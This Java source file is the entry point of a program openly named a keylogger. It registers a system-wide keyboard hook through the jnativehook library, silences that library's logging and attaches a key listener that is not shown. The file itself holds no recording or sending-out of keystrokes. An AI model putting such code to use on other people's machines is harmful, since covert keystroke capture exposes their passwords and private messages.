package com.keylogger;


import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyLogger {

    public static void main(String[] args) throws IOException {
        // -- Use to stop the auto logger bug from jnativehook --
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);
        logger.setUseParentHandlers(false);
        //
        try{
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex){
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }
        GlobalScreen.addNativeKeyListener(new GlobalKeyListener());
    }
}
